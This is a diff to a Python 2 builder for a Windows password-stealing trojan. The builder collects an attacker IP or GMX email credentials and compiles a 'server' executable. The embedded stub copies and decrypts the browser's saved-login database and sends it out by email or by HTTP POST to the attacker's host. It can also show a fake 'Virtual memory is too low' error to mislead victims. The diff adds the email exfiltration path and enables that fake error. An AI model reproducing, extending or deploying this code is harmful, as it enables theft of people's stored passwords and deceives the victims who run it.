@@ -2,6 +2,9 @@
 #Contains test code to be cleaned up
 #To activate Fake Error Message uncomment line 14
 #To include custom icon, place the icon of choice in the same directory as this script and rename it "icon.ico"
+from email.MIMEMultipart import MIMEMultipart
+from email.MIMEText import MIMEText
+import smtplib
 import os, socket
 import sys
 import cgi
@@ -20,9 +23,53 @@ from urllib2 import urlopen
 from shutil import copyfile
 reload(sys)
 sys.setdefaultencoding('utf-8')
-attacker_ip = raw_input('IP for revrse connection: ')
-with open('attacker_ip.txt', 'w') as hostname:
-     hostname.write(attacker_ip)
+attacker_ip = ""
+loop = True
+error = "0"
+email = ""
+pwd = ""
+mailto = ""
+
+while loop == True:
+	os.system("cls")
+	print "Choose how you want the passwords delivered\n"
+	print "(1) - via email (only GMX supported)\n"
+	print "(2) - via the client.exe (to your computer directly)\n"
+	option=raw_input('\nChoose a number [1-2]: ')
+	if option == "1":
+		email=raw_input("Input your GMX email address: ")
+		pwd = raw_input("Input your GMX password: ")
+		mailto = raw_input("Input the email you want to send the passwords to. Leave black to send it to yourself")
+		if not mailto:
+			mailto = email
+		loop = False
+	elif option == "2":
+		attacker_ip = raw_input('IP for revrse connection: ')
+		loop = False
+
+	else:
+		raw_input("You must choose a value between 1 and 2. Enter any key to try again..")
+		
+	
+while loop == False:	
+	error = raw_input("Do you want the server to display a fake Error message? [Y/N]: ")
+	if error.lower() == "y" or error.lower() == "yes":
+		error = "1"
+		os.system("cls")
+		print "Well done!\nThe server will be created shortly. Don't close this window"
+		time.sleep(2)
+		loop = True
+
+	elif error.lower() == "n" or error.lower() == "no":
+		error = "0"
+		os.system("cls")
+		print "Well done!\nThe server will be created shortly. Don't close this window"
+		time.sleep(2)
+		loop = True
+	else:
+		raw_input("You must choose either Y or N. Enter any key to try again..")
+		
+		
 
 def done():
     os.system('cls')
@@ -51,18 +98,21 @@ def py2crypt():
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 63
-        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n')
+        i = 110
+        f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip + '\'' + '\n'+'option = ' + '\''+option+'\'' + '\n'+'email = ' + '\''+email + '\'' + '\n'+'pwd = ' + '\''+pwd +'\''+ '\n'+'mailto = ' + '\''+mailto +'\'' +'\n'+'error = ' + '\''+error +'\''+'\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
             i = i+1
     py2crypt()
-    #os.remove('server.py')
+    os.remove('server.py')
     done()
 
 """
 # -*- coding: cp1250 -*-
 import ctypes
+import smtplib
+from email.MIMEMultipart import MIMEMultipart
+from email.MIMEText import MIMEText
 import os, sys, cgi, py2exe, BaseHTTPServer, sqlite3, win32crypt
 import requests
 import subprocess
@@ -97,8 +147,6 @@ if path2.translate(ASCII_TRANS) != path2: # Contains non-ascii
   path2 = path2.decode('latin-1')
 path2=urllib.url2pathname(path2)
 
-#path="Login Data"
-#path2="Login2"
 copyfile(path, path2)
 
 
@@ -137,13 +185,34 @@ conn.close()
 
 command = "grab*" + destination
 
-req = requests.get('http://' + attacker_ip)
-grab,path=command.split('*')
-path=destination
-url = 'http://' + attacker_ip + '/store'
-files = {'file': open(path, 'rb')}
-r = requests.post(url, files=files)
-MB_OK = 0x00
-MB_ICONSTOP = 0x10
-#ctypes.windll.user32.MessageBoxW(None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
+
+
+if option == "1":
+	server = "smtp.gmx.com"
+	msg = MIMEMultipart()
+	filename=destination
+	f = open(filename)
+	attachment= MIMEText(f.read())
+	attachment.add_header('Content-Disposition', 'attachment', filename=filename)
+	msg.attach(attachment)
+
+
+	mailer = smtplib.SMTP(server, 587)
+	mailer.starttls()
+	mailer.login(email, pwd)
+	mailer.sendmail(email, mailto, msg.as_string())
+	mailer.close()
+
+else:
+	req = requests.get('http://' + attacker_ip)
+	grab,path=command.split('*')
+	path=destination
+	url = 'http://' + attacker_ip + '/store'
+	files = {'file': open(path, 'rb')}
+	r = requests.post(url, files=files)
+
+if error == "1":
+	MB_OK = 0x00
+	MB_ICONSTOP = 0x10
+	ctypes.windll.user32.MessageBoxW(None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
 """
